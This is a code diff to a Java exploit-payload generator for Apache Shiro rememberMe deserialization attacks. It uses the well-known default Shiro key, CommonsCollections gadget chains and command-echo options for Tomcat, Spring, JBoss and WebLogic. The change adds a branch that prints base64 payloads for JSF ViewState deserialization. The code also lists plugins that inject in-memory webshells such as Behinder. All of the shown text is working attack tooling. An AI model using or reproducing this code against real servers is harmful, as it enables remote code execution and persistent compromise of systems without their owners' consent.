@@ -84,13 +84,13 @@ public class Shiro implements FramePayload {
 
 
     public static void main(String[] args) throws Exception {
-        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass("CommonsCollectionsK1");
+        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass("CommonsCollections8");
         ObjectPayload<?> gadgetpayload = gadgetClazz.newInstance();
 
-        List<String> echoList = Arrays.asList("TomcatEcho","TomcatEcho1","TomcatEcho2", "SpringEcho", "SpringEcho1", "TestClassLoad", "NoEcho");
+        List<String> echoList = Arrays.asList("TomcatEcho", "TomcatEcho1", "TomcatEcho2", "SpringEcho", "SpringEcho1", "TestClassLoad", "NoEcho", "JbossEcho", "WeblogicEcho");
         List<String> pluginList = Arrays.asList("InjectMemTool", "InjectMomBehinder", "InjectClassLoader");
 
-        String option = "TomcatEcho2";
+        String option = "WeblogicEcho";
 
         Object template = null;
         Object chainObject = null;
@@ -103,14 +103,19 @@ public class Shiro implements FramePayload {
         }
 
         Shiro shiro = new Shiro();
-        if (template != null && !option.equals("KeyEcho")) {
+        if (template != null && !option.equals("KeyEcho") && !option.equals("WeblogicEcho")) {
             chainObject = gadgetpayload.getObject(template);
 
             final String sendpayload = shiro.sendpayload(chainObject, "kPH+bIxk5D2deZiIxcaaaA==");
             System.out.println(sendpayload);
         } else {
-            final String sendpayload = shiro.sendpayload(DserUtil.principal, "kPH+bIxk5D2deZiIxcaaaA==");
-            System.out.println(sendpayload);
+            // jsf viewstate deser
+            chainObject = gadgetpayload.getObject(template);
+            byte[] serpayload = SerializableUtils.toByteArray(chainObject);
+            System.out.println(DatatypeConverter.printBase64Binary(serpayload));
+            // shiro
+//            final String sendpayload = shiro.sendpayload(DserUtil.principal, "kPH+bIxk5D2deZiIxcaaaA==");
+//            System.out.println(sendpayload);
         }
 
 //        List<String> shiroKeys = new ArrayList<String>();
